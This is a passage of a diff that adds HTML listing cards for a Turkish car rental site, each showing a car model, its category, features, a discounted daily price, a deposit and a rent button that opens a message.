+<h3 onclick="wpMesaj('Opel Grandland')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Opel Grandland</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">PRESTİJ</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Opel Grandland" class="car-image" src="assets/4e17fbe4_9A139B68-4F47-4A6F-A5FB-5A7221BF77FA.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Opel Grandland')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">2.857 TL</span>
+<span class="amount">2.000 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Opel Grandland')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Opel Grandland')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="PRESTİJ">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Chery Tiggo 7 Pro')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Chery Tiggo 7 Pro</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">PRESTİJ</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Chery Tiggo 7 Pro" class="car-image" src="assets/949a3cb8_FA5329CC-CF0F-40B8-8D44-14096228F350.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Chery Tiggo 7 Pro')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">3.143 TL</span>
+<span class="amount">2.200 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Chery Tiggo 7 Pro')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Chery Tiggo 7 Pro')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="PREMIUM">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('BMW 3 Serisi')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">BMW 3 Serisi</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">PREMIUM</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="BMW 3 Serisi" class="car-image" src="assets/f82398d2_8B30CF2E-CAD8-4FF8-81AF-182E52A91A9C.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('BMW 3 Serisi')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">3.286 TL</span>
+<span class="amount">2.300 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('BMW 3 Serisi')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('BMW 3 Serisi')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="LÜKS">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Audi A5')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Audi A5</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">LÜKS</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Audi A5" class="car-image" src="assets/4fdf6de0_D81C50A6-6BF3-46BF-83B1-A4C57D515408.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Audi A5')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">3.429 TL</span>
+<span class="amount">2.400 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Audi A5')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Audi A5')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="PRESTİJ">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('BYD SEAL U DM I')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">BYD SEAL U DM I</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">PRESTİJ</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="BYD SEAL U DM I" class="car-image" src="assets/50f55ae9_0BD95297-48DB-43EA-B3C5-156ADDCC5931.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Hibrit</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('BYD SEAL U DM I')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">3.429 TL</span>
+<span class="amount">2.400 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('BYD SEAL U DM I')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('BYD SEAL U DM I')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="PREMIUM">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Audi Q3')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Audi Q3</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">PREMIUM</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Audi Q3" class="car-image" src="assets/1fc43d25_321B554D-4DFD-4E99-BC98-855B975721F3.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Audi Q3')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">3.429 TL</span>
+<span class="amount">2.400 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Audi Q3')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Audi Q3')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="PREMIUM">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Volvo XC40')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Volvo XC40</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">PREMIUM</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Volvo XC40" class="car-image" src="assets/23e09c84_0D989887-1372-4256-9140-673D233B0E27.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Volvo XC40')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">3.643 TL</span>
+<span class="amount">2.550 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Volvo XC40')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Volvo XC40')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="PREMIUM">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Audi A6')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Audi A6</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">PREMIUM</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Audi A6" class="car-image" src="assets/a13ef455_96E0B13A-98FB-4C03-9DAE-74830060DFEE.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Audi A6')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">3.857 TL</span>
+<span class="amount">2.700 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Audi A6')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Audi A6')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="PREMIUM">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Volvo EX40')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Volvo EX40</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">PREMIUM</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Volvo EX40" class="car-image" src="assets/d4d4a7c1_359ACA8F-2E67-4628-B0B7-797050B46E50.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Volvo EX40')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">3.929 TL</span>
+<span class="amount">2.750 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Volvo EX40')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Volvo EX40')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="PREMIUM">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Volvo S60')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Volvo S60</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">PREMIUM</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Volvo S60" class="car-image" src="assets/cf64b4f3_EB280F38-D68F-4AC2-91B9-20863739CDB4.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Volvo S60')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">4.000 TL</span>
+<span class="amount">2.800 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Volvo S60')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Volvo S60')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="PREMIUM">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('BMW 5 Serisi')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">BMW 5 Serisi</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">PREMIUM</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="BMW 5 Serisi" class="car-image" src="assets/eba7b1a3_5E054D97-3DC9-45CE-8F98-DF7FF26A1820.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('BMW 5 Serisi')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">4.143 TL</span>
+<span class="amount">2.900 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('BMW 5 Serisi')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('BMW 5 Serisi')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="PREMIUM">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Peugeot 5008')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Peugeot 5008</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">PREMIUM</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Peugeot 5008" class="car-image" src="assets/85ce45e2_FA95907E-E9C8-455D-AB6F-9CCECEA40343.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Peugeot 5008')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">4.286 TL</span>
+<span class="amount">3.000 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Peugeot 5008')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Peugeot 5008')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="PREMIUM">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Mercedes C200 d AMG')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Mercedes C200 d AMG</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">PREMIUM</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Mercedes C200 d AMG" class="car-image" src="assets/d112490f_224BB893-D231-4FA0-AC3B-7889FB66CF4C.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Dizel</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Mercedes C200 d AMG')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">4.286 TL</span>
+<span class="amount">3.000 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Mercedes C200 d AMG')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Mercedes C200 d AMG')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="VAN">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Fiat Ulysee')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Fiat Ulysee</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">VAN</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Fiat Ulysee" class="car-image" src="assets/1bdc8ad8_7AD8F56A-04AD-48D9-ABE1-1B867144C860.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Dizel</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Fiat Ulysee')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">4.571 TL</span>
+<span class="amount">3.200 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Fiat Ulysee')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Fiat Ulysee')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="LÜKS">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Volvo XC90')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Volvo XC90</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">LÜKS</span>
+<span style="background:#DC2626;color:#fff;font-size:0.7rem;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:0.5px;display:inline-flex;align-items:center;gap:4px;"><i class="fa-solid fa-shield-halved"></i> FULL KASKO</span>
+</div>
+</div>
+<img alt="Volvo XC90" class="car-image" src="assets/6f5cb613_F5B7BBDA-1991-4F6A-96D7-7C722FD542B0.jpg"/>
+<div class="car-features">
+<span><i class="fa-solid fa-gas-pump"></i> Benzin</span>
+<span><i class="fa-solid fa-gear"></i> Otomatik</span>
+<span><i class="fa-solid fa-suitcase"></i> 3 Valiz</span>
+<span><i class="fa-solid fa-road"></i> Sınırsız Km</span>
+</div>
+<div class="car-footer">
+<div class="car-prices-row">
+<div class="car-price" onclick="wpMesaj('Volvo XC90')" style="position:relative;overflow:visible;display:flex;flex-direction:column;justify-content:flex-end;">
+<div class="indirim-badge">%30 İNDİRİM</div>
+<span class="label" style="padding-top:4px;"><i class="fa-solid fa-tag"></i> Günlük Ücret</span>
+<span class="eski-fiyat">4.571 TL</span>
+<span class="amount">3.200 TL</span>
+</div>
+<div class="car-depozito" onclick="wpMesaj('Volvo XC90')" style="display:flex;flex-direction:column;justify-content:flex-end;">
+<span class="label"><i class="fa-solid fa-shield"></i> Depozito</span>
+<span class="per">(iade edilir)</span>
+<span class="amount">3.000 TL</span>
+</div>
+</div>
+<button class="btn-kirala" onclick="wpMesaj('Volvo XC90')">
+<i class="fa-solid fa-circle-check"></i> Hemen Kirala
+        </button>
+</div>
+</div>
+<div class="car-card" data-tur="LÜKS">
+<div class="car-header" style="padding:14px 16px 10px;display:flex;flex-direction:column;gap:8px;align-items:center;">
+<h3 onclick="wpMesaj('Mercedes E200')" style="margin:0;font-size:1.35rem;font-weight:700;color:#1F2937;display:block;width:100%;text-align:center;cursor:pointer;">Mercedes E200</h3>
+<div style="display:flex;flex-direction:row;align-items:center;gap:16px;">
+<span class="car-type">LÜKS</span>
